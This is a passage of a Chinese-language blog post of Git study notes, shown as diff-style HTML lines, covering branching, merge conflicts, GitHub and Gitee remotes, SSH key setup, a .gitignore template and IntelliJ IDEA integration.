+<h2 id="3-7-历史版本"><a href="#3-7-历史版本" class="headerlink" title="3.7 历史版本"></a>3.7 历史版本</h2><h3 id="3-7-1-查看历史版本"><a href="#3-7-1-查看历史版本" class="headerlink" title="3.7.1 查看历史版本"></a>3.7.1 查看历史版本</h3><p>git reflog   查看版本信息</p>
+<p>git log   查看版本详细信息</p>
+<p><img src="/2022/02/22/Git/image-20220223202021790.png" alt="image-20220223202021790"></p>
+<p><img src="/2022/02/22/Git/image-20220223202803846.png" alt="image-20220223202803846"></p>
+<h3 id="3-7-2-版本穿梭"><a href="#3-7-2-版本穿梭" class="headerlink" title="3.7.2 版本穿梭"></a>3.7.2 版本穿梭</h3><p>git reset –hard 版本号</p>
+<p><img src="/2022/02/22/Git/image-20220223202600392.png" alt="image-20220223202600392"></p>
+<p><img src="/2022/02/22/Git/image-20220223203018161.png" alt="image-20220223203018161"></p>
+<p><img src="/2022/02/22/Git/image-20220223202613569.png" alt="image-20220223202613569"></p>
+<h1 id="第四章-Git分支操作"><a href="#第四章-Git分支操作" class="headerlink" title="第四章 Git分支操作"></a>第四章 Git分支操作</h1><p><img src="/2022/02/22/Git/image-20220223204103328.png" alt="image-20220223204103328"></p>
+<h2 id="4-1-什么是分支"><a href="#4-1-什么是分支" class="headerlink" title="4.1 什么是分支"></a>4.1 什么是分支</h2><p>在版本控制过程中，同时推进多个任务，为每个任务，我们就可以创建每个任务的单独分支。使用分支意味着程序员可以把自己的工作从开发主线上分离开来，开发自己分支的时候，不会影响主线分支的运行。对于初学者而言，分支可以简单理解为副本，一个分支就是一个单独的副本。(分支底层其实也是指针的引用)</p>
+<p><img src="/2022/02/22/Git/image-20220223211510203.png" alt="image-20220223211510203"></p>
+<h2 id="4-2-分支的好处"><a href="#4-2-分支的好处" class="headerlink" title="4.2 分支的好处"></a>4.2 分支的好处</h2><p>同时并行推进多个功能开发，提高开发效率。<br>各个分支在开发过程中，如果某一个分支开发失败，不会对其他分支有任何影响。失败的分支删除重新开始即可。</p>
+<h2 id="4-3-分支的操作"><a href="#4-3-分支的操作" class="headerlink" title="4.3 分支的操作"></a>4.3 分支的操作</h2><p><img src="/2022/02/22/Git/image-20220223211647861.png" alt="image-20220223211647861"></p>
+<h3 id="4-3-1-查看分支"><a href="#4-3-1-查看分支" class="headerlink" title="4.3.1 查看分支"></a>4.3.1 查看分支</h3><p>git branch -v</p>
+<p><img src="/2022/02/22/Git/image-20220223211927913.png" alt="image-20220223211927913"></p>
+<h3 id="4-3-2-创建分支"><a href="#4-3-2-创建分支" class="headerlink" title="4.3.2 创建分支"></a>4.3.2 创建分支</h3><p>git branch 分支名</p>
+<p>创建一个热修分支（修复）：<img src="/2022/02/22/Git/image-20220223212213235.png" alt="image-20220223212213235"></p>
+<h3 id="4-3-3-切换分支与修改分支"><a href="#4-3-3-切换分支与修改分支" class="headerlink" title="4.3.3 切换分支与修改分支"></a>4.3.3 切换分支与修改分支</h3><p>切换：git checkout 分支名</p>
+<p><img src="/2022/02/22/Git/image-20220223212734467.png" alt="image-20220223212734467"></p>
+<p>hello.txt仍然在，修改hello.txt</p>
+<p><img src="/2022/02/22/Git/image-20220223213012342.png" alt="image-20220223213012342"></p>
+<p>添加暂存区，提交本地库<img src="/2022/02/22/Git/image-20220223213320907.png" alt="image-20220223213320907"></p>
+<h3 id="4-3-4-合并分支"><a href="#4-3-4-合并分支" class="headerlink" title="4.3.4 合并分支"></a>4.3.4 合并分支</h3><p>git merge 分支名</p>
+<p>切换回master分支</p>
+<p><img src="/2022/02/22/Git/image-20220223213653996.png" alt="image-20220223213653996"></p>
+<p>合并分支：</p>
+<p><img src="/2022/02/22/Git/image-20220223213835709.png" alt="image-20220223213835709"></p>
+<p>查看当前分支文件状态：</p>
+<p><img src="/2022/02/22/Git/image-20220223213927615.png" alt="image-20220223213927615"></p>
+<h3 id="4-3-5-产生冲突"><a href="#4-3-5-产生冲突" class="headerlink" title="4.3.5 产生冲突"></a>4.3.5 产生冲突</h3><p>冲突产生的原因:<br>合并分支时，两个分支在同一个文件的同一个位置有两套完全不同的修改。Git无法替我们决定使用哪一个。必须人为决定新代码内容。</p>
+<p>在master上修改：</p>
+<p><img src="/2022/02/22/Git/image-20220223214402900.png" alt="image-20220223214402900"></p>
+<p>添加暂存区，提交本地库</p>
+<p>切换分支：hot-fix ,修改hello.txt</p>
+<p><img src="/2022/02/22/Git/image-20220223214850106.png" alt="image-20220223214850106"></p>
+<p>添加暂存区，提交本地库。切回master，合并分支，报冲突</p>
+<p><img src="/2022/02/22/Git/image-20220223215237312.png" alt="image-20220223215237312"></p>
+<h3 id="4-3-6-解决冲突"><a href="#4-3-6-解决冲突" class="headerlink" title="4.3.6 解决冲突"></a>4.3.6 解决冲突</h3><p>手动合并代码，手动打开文件：</p>
+<p><img src="/2022/02/22/Git/image-20220223215355470.png" alt="image-20220223215355470"></p>
+<p>把master test下一行，hot-fix上一行，以及那些特殊符号的行删掉</p>
+<p><img src="/2022/02/22/Git/image-20220223215702867.png" alt="image-20220223215702867"></p>
+<p>保存完文件后：添加暂存区，提交本地库<strong>（注意：此时提交本地库命令时不能带文件名）</strong> 否则报错：<img src="/2022/02/22/Git/image-20220223220403901.png" alt="image-20220223220403901"></p>
+<p>因此：不能带文件名：<img src="/2022/02/22/Git/image-20220223220506070.png" alt="image-20220223220506070"></p>
+<p>hot-fix分支下仍为下图所示，没有master test，只有合并到的分支才改变</p>
+<p><img src="/2022/02/22/Git/image-20220223220737847.png" alt="image-20220223220737847"></p>
+<h2 id="4-4-创建分支和切换分支图解"><a href="#4-4-创建分支和切换分支图解" class="headerlink" title="4.4 创建分支和切换分支图解"></a>4.4 创建分支和切换分支图解</h2><p><img src="/2022/02/22/Git/image-20220223220956419.png" alt="image-20220223220956419"></p>
+<p><img src="/2022/02/22/Git/image-20220223221016099.png" alt="image-20220223221016099"></p>
+<h1 id="第五章-Git团队协作机制"><a href="#第五章-Git团队协作机制" class="headerlink" title="第五章 Git团队协作机制"></a>第五章 Git团队协作机制</h1><p><img src="/2022/02/22/Git/image-20220223222620011.png" alt="image-20220223222620011"></p>
+<h2 id="5-1-团队内协作"><a href="#5-1-团队内协作" class="headerlink" title="5.1 团队内协作"></a>5.1 团队内协作</h2><p><img src="/2022/02/22/Git/image-20220223222722893.png" alt="image-20220223222722893"></p>
+<p>push ：推送            clone：克隆，完整复制到本地库        pull：拉取</p>
+<p>pull是本地有文件，对本地库已有文件代码更新；clone是本地无源代码</p>
+<h2 id="5-2-跨团队协作"><a href="#5-2-跨团队协作" class="headerlink" title="5.2 跨团队协作"></a>5.2 跨团队协作</h2><p><img src="/2022/02/22/Git/image-20220223223330616.png" alt="image-20220223223330616"></p>
+<p>fork:  将代码从一个远程库复制到另一个远程库</p>
+<p>git的版本控制都是在本地库里做的</p>
+<h1 id="第六章-GitHub操作"><a href="#第六章-GitHub操作" class="headerlink" title="第六章 GitHub操作"></a>第六章 GitHub操作</h1><p><a target="_blank" rel="noopener" href="https://github.com/">https://github.com</a></p>
+<h2 id="6-1-创建远程仓库"><a href="#6-1-创建远程仓库" class="headerlink" title="6.1 创建远程仓库"></a>6.1 创建远程仓库</h2><p><img src="/2022/02/22/Git/image-20220223224929261.png" alt="image-20220223224929261"></p>
+<p>远程库的名字与本地库一样，本地库自己设置的叫git-demo</p>
+<p><img src="/2022/02/22/Git/image-20220223225409252.png" alt="image-20220223225409252"></p>
+<p>远程库链接</p>
+<p><img src="/2022/02/22/Git/image-20220223225505833.png" alt="image-20220223225505833"></p>
+<h2 id="6-2-远程仓库操作"><a href="#6-2-远程仓库操作" class="headerlink" title="6.2 远程仓库操作"></a>6.2 远程仓库操作</h2><p><img src="/2022/02/22/Git/image-20220223225543461.png" alt="image-20220223225543461"></p>
+<h3 id="6-2-1-创建远程仓库别名"><a href="#6-2-1-创建远程仓库别名" class="headerlink" title="6.2.1 创建远程仓库别名"></a>6.2.1 创建远程仓库别名</h3><p>git remote -v 查看当前所有远程地址别名</p>
+<p>git remote add 别名 远程地址</p>
+<p><img src="/2022/02/22/Git/image-20220223225837966.png" alt="image-20220223225837966"></p>
+<p>两个的意思是既可以推送也可以拉取</p>
+<h3 id="6-2-2-推送本地分支到远程仓库"><a href="#6-2-2-推送本地分支到远程仓库" class="headerlink" title="6.2.2 推送本地分支到远程仓库"></a>6.2.2 推送本地分支到远程仓库</h3><p>git push 别名 分支</p>
+<p><img src="/2022/02/22/Git/image-20220224105940039.png" alt="image-20220224105940039"></p>
+<p><img src="/2022/02/22/Git/image-20220224110106845.png" alt="image-20220224110106845"></p>
+<h3 id="6-2-3-拉取远程仓库到本地"><a href="#6-2-3-拉取远程仓库到本地" class="headerlink" title="6.2.3 拉取远程仓库到本地"></a>6.2.3 拉取远程仓库到本地</h3><p>拉取：git pull 别名 分支</p>
+<p>远程库修改了文件：<img src="/2022/02/22/Git/image-20220224110428884.png" alt="image-20220224110428884"></p>
+<p>和本地库不一致，拉取到本地库：</p>
+<p><img src="/2022/02/22/Git/image-20220224110634193.png" alt="image-20220224110634193"></p>
+<p><img src="/2022/02/22/Git/image-20220224110758579.png" alt="image-20220224110758579"></p>
+<h3 id="6-2-4-克隆远程仓库到本地"><a href="#6-2-4-克隆远程仓库到本地" class="headerlink" title="6.2.4 克隆远程仓库到本地"></a>6.2.4 克隆远程仓库到本地</h3><p>git clone 远程地址</p>
+<p><img src="/2022/02/22/Git/image-20220224113927968.png" alt="image-20220224113927968"></p>
+<p><img src="/2022/02/22/Git/image-20220224114413305.png" alt="image-20220224114413305"></p>
+<p>小结：clone会做如下操作：1、拉取代码；2、初始化本地仓库；3、创建别名</p>
+<h3 id="6-2-5-邀请加入团队"><a href="#6-2-5-邀请加入团队" class="headerlink" title="6.2.5 邀请加入团队"></a>6.2.5 邀请加入团队</h3><p><img src="/2022/02/22/Git/image-20220224115620747.png" alt="image-20220224115620747"></p>
+<p>同一团队才能推送代码: git push 链接 分支 </p>
+<p> 邀请团队：Settings-&gt;Manage access-&gt;Invite a collaborator-&gt;复制邀请函（链接地址）-&gt;团队成员在自己GitHub链接哪儿粘贴邀请函链接-&gt;accept</p>
+<p><img src="/2022/02/22/Git/image-20220224115912094.png" alt="image-20220224115912094"></p>
+<p><img src="/2022/02/22/Git/image-20220224120114334.png" alt="image-20220224120114334"></p>
+<p><img src="/2022/02/22/Git/image-20220224120218792.png" alt="image-20220224120218792"></p>
+<p><img src="/2022/02/22/Git/image-20220224120253388.png" alt="image-20220224120253388"></p>
+<p>团队成员账号登录后：<img src="/2022/02/22/Git/image-20220224120446181.png" alt="image-20220224120446181"></p>
+<p><img src="/2022/02/22/Git/image-20220224120506194.png" alt="image-20220224120506194"></p>
+<p>同意后就可在团队成员账号上看到创始人的远程库，就可以推送了</p>
+<p><img src="/2022/02/22/Git/image-20220224120726893.png" alt="image-20220224120726893"></p>
+<h2 id="6-3-跨团队协作"><a href="#6-3-跨团队协作" class="headerlink" title="6.3 跨团队协作"></a>6.3 跨团队协作</h2><p><img src="/2022/02/22/Git/image-20220223223330616.png" alt="image-20220223223330616"></p>
+<p>团队外的人访问别人库链接-&gt;点Fork-&gt;在自己账号内修改完后-&gt;Pull requests-&gt;</p>
+<p><img src="/2022/02/22/Git/image-20220224121457775.png" alt="image-20220224121457775"></p>
+<p>fork之后在自己账号下就有了一个git-demo,就可以修改代码了<img src="/2022/02/22/Git/image-20220224121649509.png" alt="image-20220224121649509"></p>
+<p><img src="/2022/02/22/Git/image-20220224121944351.png" alt="image-20220224121944351"></p>
+<p><img src="/2022/02/22/Git/image-20220224143110032.png" alt="image-20220224143110032"></p>
+<p>再在创建团队的那个人的账号内<img src="/2022/02/22/Git/image-20220224143407764.png" alt="image-20220224143407764"></p>
+<p> 有一个Pull requests<img src="/2022/02/22/Git/image-20220224143446634.png" alt="image-20220224143446634"></p>
+<p>确认代码后,提交合并申请：<img src="/2022/02/22/Git/image-20220224143652221.png" alt="image-20220224143652221"></p>
+<p>并确认：<img src="/2022/02/22/Git/image-20220224143733220.png" alt="image-20220224143733220"></p>
+<h2 id="6-4-SSH免密登录"><a href="#6-4-SSH免密登录" class="headerlink" title="6.4 SSH免密登录"></a>6.4 SSH免密登录</h2><p>远程仓库中还有一个SSH的地址，因此也可以使用SSH进行访问<img src="/2022/02/22/Git/image-20220224143952661.png" alt="image-20220224143952661"></p>
+<p>C:/用户/DELL/.ssh</p>
+<p><img src="/2022/02/22/Git/image-20220224144634345.png" alt="image-20220224144634345"></p>
+<p>连续敲三次回车：<img src="/2022/02/22/Git/image-20220224144710503.png" alt="image-20220224144710503"></p>
+<p><img src="/2022/02/22/Git/image-20220224145004685.png" alt="image-20220224145004685"></p>
+<p>将公钥，也就是上图，复制到GitHub账号</p>
+<p>Settings-&gt;SSH and GPG keys-&gt;New SSH key 这样Windows连接此账号就不需要反复输入账号密码</p>
+<p><img src="/2022/02/22/Git/image-20220224145113677.png" alt="image-20220224145113677"></p>
+<p><img src="/2022/02/22/Git/image-20220224145200959.png" alt="image-20220224145200959"></p>
+<p><img src="/2022/02/22/Git/image-20220224145410299.png" alt="image-20220224145410299"></p>
+<p>就可以git pull SSH</p>
+<p>例如：git pull <a href="mailto:&#103;&#105;&#116;&#x40;&#x67;&#x69;&#116;&#104;&#x75;&#x62;&#46;&#99;&#x6f;&#109;">&#103;&#105;&#116;&#x40;&#x67;&#x69;&#116;&#104;&#x75;&#x62;&#46;&#99;&#x6f;&#109;</a>:cjtyx/git-demo.git</p>
+<h1 id="第七章-IDEA集成Git"><a href="#第七章-IDEA集成Git" class="headerlink" title="第七章 IDEA集成Git"></a>第七章 IDEA集成Git</h1><h2 id="7-1-配置Git忽略文件"><a href="#7-1-配置Git忽略文件" class="headerlink" title="7.1 配置Git忽略文件"></a>7.1 配置Git忽略文件</h2><p>idea 特定文件，让git忽略</p>
+<p><img src="/2022/02/22/Git/image-20220224151555215.png" alt="image-20220224151555215"></p>
+<p>问题1：为什么要忽略他们？</p>
+<p>答：与项目的实际功能无关，不参与服务器上部署运行。把他们忽略掉能够屏蔽IDE工具之间的差异</p>
+<p>问题2：怎么忽略？</p>
+<p>1）创建忽略规则文件 xxxx.ignore(前缀名随便起，建议是git.ignore)</p>
+<p>这个文件的存放位置原则是哪里都可以，为了便于让~/.gitconfig文件引用，建议放在用户家目录下</p>
+<p>git.ignore 文件模板内容如下：</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Compiled class file</span></span><br><span class="line">*<span class="string">.class</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Log file</span></span><br><span class="line">*<span class="string">.log</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># BlueJ files</span></span><br><span class="line">*<span class="string">.ctxt</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Mobile Tools for Java (J2ME)</span></span><br><span class="line"><span class="string">.mtj.tmp/</span><span class="comment"># Package Files #</span></span><br><span class="line">*<span class="string">.jar</span></span><br><span class="line">*<span class="string">.war</span></span><br><span class="line">*<span class="string">.nar</span></span><br><span class="line">*<span class="string">.ear</span></span><br><span class="line">*<span class="string">.zip</span></span><br><span class="line">*<span class="string">.tar.gz</span></span><br><span class="line">*<span class="string">.rar</span></span><br><span class="line"></span><br><span class="line">hs_err_pid*</span><br><span class="line"></span><br><span class="line"><span class="string">.classpath</span></span><br><span class="line"><span class="string">.project</span></span><br><span class="line"><span class="string">.settings</span></span><br><span class="line">target</span><br><span class="line"><span class="string">.idea</span></span><br><span class="line">*<span class="string">.iml</span></span><br></pre></td></tr></table></figure>
+
+<p>2）在.gitconfig 文件中引用忽略配置文件（此文件在Windows的家目录中）</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-attr">[user]</span></span><br><span class="line">    name = Echo</span><br><span class="line">    email = <span class="number">2081297822</span>@qq<span class="selector-class">.com</span></span><br><span class="line"><span class="selector-attr">[core]</span></span><br><span class="line">	excludesfile = C:/用户/DELL/git<span class="selector-class">.ignore</span></span><br><span class="line">注意：用正斜线而不是反斜线</span><br></pre></td></tr></table></figure>
+
+<h2 id="7-2-定位Git程序"><a href="#7-2-定位Git程序" class="headerlink" title="7.2 定位Git程序"></a>7.2 定位Git程序</h2><p>IDEA创建一个Maven项目<img src="/2022/02/22/Git/image-20220224160709229.png" alt="image-20220224160709229"></p>
+<p>步骤：文件-&gt;设置—&gt;版本控制—&gt;Git-&gt;</p>
+<p><img src="/2022/02/22/Git/image-20220224161411550.png" alt="image-20220224161411550"></p>
+<h2 id="7-3-初始化本地库"><a href="#7-3-初始化本地库" class="headerlink" title="7.3 初始化本地库"></a>7.3 初始化本地库</h2><p>在最上面工具栏VCS(版本控制工具的设置)</p>
+<p><img src="/2022/02/22/Git/image-20220224161908393.png" alt="image-20220224161908393"></p>
+<p><img src="/2022/02/22/Git/image-20220224162018726.png" alt="image-20220224162018726"></p>
+<p><img src="/2022/02/22/Git/image-20220224162251418.png" alt="image-20220224162251418"></p>
+<p>pom.xml 变红了：未被追踪到，应添加到暂存区</p>
+<h2 id="7-4-添加到暂存区"><a href="#7-4-添加到暂存区" class="headerlink" title="7.4 添加到暂存区"></a>7.4 添加到暂存区</h2><p><img src="/2022/02/22/Git/image-20220224162511675.png" alt="image-20220224162511675"></p>
+<p>pom.xml 变绿了：已经添加到了暂存区，但是没有提交本地库</p>
+<p>在/src/main/java下创建一个软件包：com.Echo.git</p>
+<p>再在软件包下创建一个Java类：GitTest</p>
+<p><img src="/2022/02/22/Git/image-20220224163018605.png" alt="image-20220224163018605"></p>
+<p>可以先取消，然后写代码：<img src="/2022/02/22/Git/image-20220224163305184.png" alt="image-20220224163305184"></p>
+<p>再添加暂存区：可以右键项目根目录（git-test)，把整个项目添加暂存区</p>
+<h2 id="7-5-提交到本地库"><a href="#7-5-提交到本地库" class="headerlink" title="7.5 提交到本地库"></a>7.5 提交到本地库</h2><p><img src="/2022/02/22/Git/image-20220224175158139.png" alt="image-20220224175158139"></p>
+<p><img src="/2022/02/22/Git/image-20220224175311030.png" alt="image-20220224175311030"></p>
+<h2 id="7-6-切换版本"><a href="#7-6-切换版本" class="headerlink" title="7.6 切换版本"></a>7.6 切换版本</h2><p>修改文件后，添加暂存区，提交本地库</p>
+<p><img src="/2022/02/22/Git/image-20220224175606609.png" alt="image-20220224175606609"></p>
+<p><img src="/2022/02/22/Git/image-20220224175707155.png" alt="image-20220224175707155"></p>
+<p>再弄第三个版本。</p>
+<p><img src="/2022/02/22/Git/image-20220224180012879.png" alt="image-20220224180012879"></p>
+<p>查看版本信息：IDEA左下角!<img src="/2022/02/22/Git/image-20220224180724346.png" alt="image-20220224180724346"></p>
+<p>切换版本：<img src="/2022/02/22/Git/image-20220224181014769.png" alt="image-20220224181014769"></p>
+<h2 id="7-7-创建分支"><a href="#7-7-创建分支" class="headerlink" title="7.7 创建分支"></a>7.7 创建分支</h2><p><img src="/2022/02/22/Git/image-20220224181512259.png" alt="image-20220224181512259"></p>
+<p>点击后出现一个框<img src="/2022/02/22/Git/image-20220224181550885.png" alt="image-20220224181550885"></p>
+<p>或者IDEA右下角：<img src="/2022/02/22/Git/image-20220224181617635.png" alt="image-20220224181617635"></p>
+<p>新分支就可创建</p>
+<h2 id="7-8-切换分支"><a href="#7-8-切换分支" class="headerlink" title="7.8 切换分支"></a>7.8 切换分支</h2><p>创建新分支后：<img src="/2022/02/22/Git/image-20220224181802461.png" alt="image-20220224181802461"></p>
+<p>如何切换回去，点击即可： <img src="/2022/02/22/Git/image-20220224181831401.png" alt="image-20220224181831401"></p>
+<h2 id="7-9-合并分支"><a href="#7-9-合并分支" class="headerlink" title="7.9 合并分支"></a>7.9 合并分支</h2><p><img src="/2022/02/22/Git/image-20220224182144086.png" alt="image-20220224182144086"></p>
+<p>如果代码没有冲突，分支直接合并成功，分支合并成功后，代码自动提交，无需手动提交本地库</p>
+<p><img src="/2022/02/22/Git/image-20220224182541949.png" alt="image-20220224182541949"></p>
+<p>有两个绿色的代表有两个分支，合并到当前分支即可：<img src="/2022/02/22/Git/image-20220224182717540.png" alt="image-20220224182717540"></p>
+<h2 id="7-10-解决冲突"><a href="#7-10-解决冲突" class="headerlink" title="7.10 解决冲突"></a>7.10 解决冲突</h2><p>1)在hot-fix分支上：提交本地库</p>
+<p><img src="/2022/02/22/Git/image-20220224182912383.png" alt="image-20220224182912383"></p>
+<p>切换回master：<img src="/2022/02/22/Git/image-20220224183023672.png" alt="image-20220224183023672"></p>
+<p>修改master代码：<img src="/2022/02/22/Git/image-20220224183246127.png" alt="image-20220224183246127"></p>
+<p>合并分支,产生冲突：<img src="/2022/02/22/Git/image-20220224183350511.png" alt="image-20220224183350511"></p>
+<p>点击合并后：<img src="/2022/02/22/Git/image-20220224183548945.png" alt="image-20220224183548945"></p>
+<p>左边master，右边hot-fix，中间是正常没有冲突的代码</p>
+<p><img src="/2022/02/22/Git/image-20220224183718868.png" alt="image-20220224183718868"></p>
+<p>×：不要这个代码；   》和《 ：是把代码拿到中间那个位置。结果：</p>
+<p><img src="/2022/02/22/Git/image-20220224183859323.png" alt="image-20220224183859323"></p>
+<p>日志信息：<img src="/2022/02/22/Git/image-20220224184031850.png" alt="image-20220224184031850"></p>
+<h1 id="第八章-IDEA集成GitHub"><a href="#第八章-IDEA集成GitHub" class="headerlink" title="第八章 IDEA集成GitHub"></a>第八章 IDEA集成GitHub</h1><h2 id="8-1-设置GitHub账号"><a href="#8-1-设置GitHub账号" class="headerlink" title="8.1 设置GitHub账号"></a>8.1 设置GitHub账号</h2><p>文件-&gt;设置-&gt;版本控制-&gt;GitHub</p>
+<p><img src="/2022/02/22/Git/image-20220224202610325.png" alt="image-20220224202610325"></p>
+<p>直接授权<img src="/2022/02/22/Git/image-20220224202953114.png" alt="image-20220224202953114"></p>
+<p><img src="/2022/02/22/Git/image-20220224211519334.png" alt="image-20220224211519334"></p>
+<h2 id="8-2-分享工程到GitHub"><a href="#8-2-分享工程到GitHub" class="headerlink" title="8.2 分享工程到GitHub"></a>8.2 分享工程到GitHub</h2><p>等同于创建远程库再push</p>
+<p><img src="/2022/02/22/Git/image-20220224213704185.png" alt="image-20220224213704185"></p>
+<p><img src="/2022/02/22/Git/image-20220224213940328.png" alt="image-20220224213940328"></p>
+<p><img src="/2022/02/22/Git/image-20220224215529424.png" alt="image-20220224215529424"></p>
+<h2 id="8-3-push推送本地库到远程库"><a href="#8-3-push推送本地库到远程库" class="headerlink" title="8.3 push推送本地库到远程库"></a>8.3 push推送本地库到远程库</h2><p>修改代码<img src="/2022/02/22/Git/image-20220224215829892.png" alt="image-20220224215829892"></p>
+<p><img src="/2022/02/22/Git/image-20220224220014112.png" alt="image-20220224220014112"></p>
+<p>或使用SSH免密登录push<img src="/2022/02/22/Git/image-20220224220236599.png" alt="image-20220224220236599"></p>
+<p><img src="/2022/02/22/Git/image-20220224220328672.png" alt="image-20220224220328672"></p>
+<p>结果是成功：<img src="/2022/02/22/Git/image-20220224220418868.png" alt="image-20220224220418868"></p>
+<p><strong>注意: push是将本地库代码推送到远程库，如果本地库代码跟远程库代码版本不一致，push的操作是会被拒绝的。也就是说，要想 push成功，一定要保证本地库的版本要比远程库的版本高!因此一个成熟的程序员在动手改本地代码之前，一定会先检查下远程库跟本地代码的区别!如果本地的代码版本已经落后，切记要先pull拉取一下远程库的代码，将本地代码更新到最新以后，然后再修改，提交，推送!</strong></p>
+<p><strong>push前先pull一下</strong></p>
+<h2 id="8-4-pull拉取远程库到本地库"><a href="#8-4-pull拉取远程库到本地库" class="headerlink" title="8.4 pull拉取远程库到本地库"></a>8.4 pull拉取远程库到本地库</h2><p><strong>注意: pull是拉取远端仓库代码到本地，如果远程库代码和本地库代码不一致，会自动合并，如果自动合并失败,还会涉及到手动解决冲突的问题。</strong></p>
+<p>右键点击项目，可以将远程仓库的内容pull到本地仓库</p>
+<p>在远程手动改一下代码 <img src="/2022/02/22/Git/image-20220224220743906.png" alt="image-20220224220743906"></p>
+<p><img src="/2022/02/22/Git/image-20220224221207350.png" alt="image-20220224221207350"></p>
+<p><img src="/2022/02/22/Git/image-20220224221430425.png" alt="image-20220224221430425"></p>
+<p><img src="/2022/02/22/Git/image-20220224221921424.png" alt="image-20220224221921424"></p>
+<h2 id="8-5-clone克隆远程库到本地"><a href="#8-5-clone克隆远程库到本地" class="headerlink" title="8.5 clone克隆远程库到本地"></a>8.5 clone克隆远程库到本地</h2><p><img src="/2022/02/22/Git/image-20220224222224207.png" alt="image-20220224222224207"></p>
+<p><img src="/2022/02/22/Git/image-20220224222351407.png" alt="image-20220224222351407"></p>
+<p>或：<img src="/2022/02/22/Git/image-20220224222839474.png" alt="image-20220224222839474"></p>
+<p><img src="/2022/02/22/Git/image-20220224222911463.png" alt="image-20220224222911463"></p>
+<p>填写HTTPS链接或者SSH链接都可，建议SSH免密登录</p>
+<h1 id="第九章-国内代码托管中心-码云"><a href="#第九章-国内代码托管中心-码云" class="headerlink" title="第九章 国内代码托管中心-码云"></a>第九章 国内代码托管中心-码云</h1><h2 id="9-1-简介"><a href="#9-1-简介" class="headerlink" title="9.1 简介"></a>9.1 简介</h2><p>众所周知, GitHub 服务器在国外,使用GitHub作为项目托管网站,如果网速不好的话，严重影响使用体验，甚至会出现登录不上的情况。针对这个情况，大家也可以使用国内的项目托管网站-码云。码云是开源中国推出的基于Git的代码托管服务中心，网址是<a target="_blank" rel="noopener" href="https://gitee.com/,%E4%BD%BF%E7%94%A8%E6%96%B9%E5%BC%8F%E8%B7%9FGitHub%E4%B8%80%E6%A0%B7,%E8%80%8C%E4%B8%94%E5%AE%83%E8%BF%98%E6%98%AF%E4%B8%80%E4%B8%AA%E4%B8%AD%E6%96%87%E7%BD%91%E7%AB%99%EF%BC%8C%E5%A6%82%E6%9E%9C%E4%BD%A0%E8%8B%B1%E6%96%87%E4%B8%8D%E6%98%AF%E5%BE%88%E5%A5%BD%E5%AE%83%E6%98%AF%E6%9C%80%E5%A5%BD%E7%9A%84%E9%80%89%E6%8B%A9%E3%80%82">https://gitee.com/,使用方式跟GitHub一样,而且它还是一个中文网站，如果你英文不是很好它是最好的选择。</a></p>
+<h2 id="9-2-码云账号注册和登录"><a href="#9-2-码云账号注册和登录" class="headerlink" title="9.2 码云账号注册和登录"></a>9.2 码云账号注册和登录</h2><p><img src="/2022/02/22/Git/image-20220224225337425.png" alt="image-20220224225337425"></p>
+<h2 id="9-3-码云创建远程库"><a href="#9-3-码云创建远程库" class="headerlink" title="9.3 码云创建远程库"></a>9.3 码云创建远程库</h2><p>点击首页右上角加号，选择下面的新建仓库</p>
+<p><img src="/2022/02/22/Git/image-20220224225553136.png" alt="image-20220224225553136"></p>
+<p><img src="/2022/02/22/Git/image-20220224225611642.png" alt="image-20220224225611642"></p>
+<p><img src="/2022/02/22/Git/image-20220224225835981.png" alt="image-20220224225835981"></p>
+<p>推荐用HTTPS链接</p>
+<h2 id="9-4-IDEA集成码云"><a href="#9-4-IDEA集成码云" class="headerlink" title="9.4 IDEA集成码云"></a>9.4 IDEA集成码云</h2><h3 id="9-4-1-IDEA安装码云插件"><a href="#9-4-1-IDEA安装码云插件" class="headerlink" title="9.4.1 IDEA安装码云插件"></a>9.4.1 IDEA安装码云插件</h3><p>IDEA默认不带码云插件，我们第一步要安装Gitee插件。</p>
+<p>如图所示，在idea插件商店搜索Gitee，然后点击右侧的Install按钮。</p>
+<p>安装好后可以在版本控制看到Gitee<img src="/2022/02/22/Git/image-20220225191443887.png" alt="image-20220225191443887"></p>
+<h3 id="9-4-2-IDEA连接码云"><a href="#9-4-2-IDEA连接码云" class="headerlink" title="9.4.2 IDEA连接码云"></a>9.4.2 IDEA连接码云</h3><p><img src="/2022/02/22/Git/image-20220225191613966.png" alt="image-20220225191613966"></p>
+<p>分享项目到码云：<img src="/2022/02/22/Git/image-20220225191734570.png" alt="image-20220225191734570"></p>
+<p>或者提前创建好远程库，获取到远程库链接：<a target="_blank" rel="noopener" href="https://gitee.com/cjtyx/git-test.git">https://gitee.com/cjtyx/git-test.git</a></p>
+<p>直接push<img src="/2022/02/22/Git/image-20220225192053363.png" alt="image-20220225192053363"></p>
+<p><img src="/2022/02/22/Git/image-20220225192221587.png" alt="image-20220225192221587"></p>
+<p><img src="/2022/02/22/Git/image-20220225192257491.png" alt="image-20220225192257491"></p>
+<p><img src="/2022/02/22/Git/image-20220225192446815.png" alt="image-20220225192446815"></p>
+<p>和GitHub一直</p>
+<h2 id="9-5-码云复制GitHub项目"><a href="#9-5-码云复制GitHub项目" class="headerlink" title="9.5 码云复制GitHub项目"></a>9.5 码云复制GitHub项目</h2><p>码云提供了直接复制GitHub 项目的功能，方便我们做项目的迁移和下载。具体操作如下:</p>
+<p>码云—&gt;点击“+” -&gt;新建仓库-&gt;点击导入已有仓库</p>
+<p><img src="/2022/02/22/Git/image-20220225193104172.png" alt="image-20220225193104172"></p>
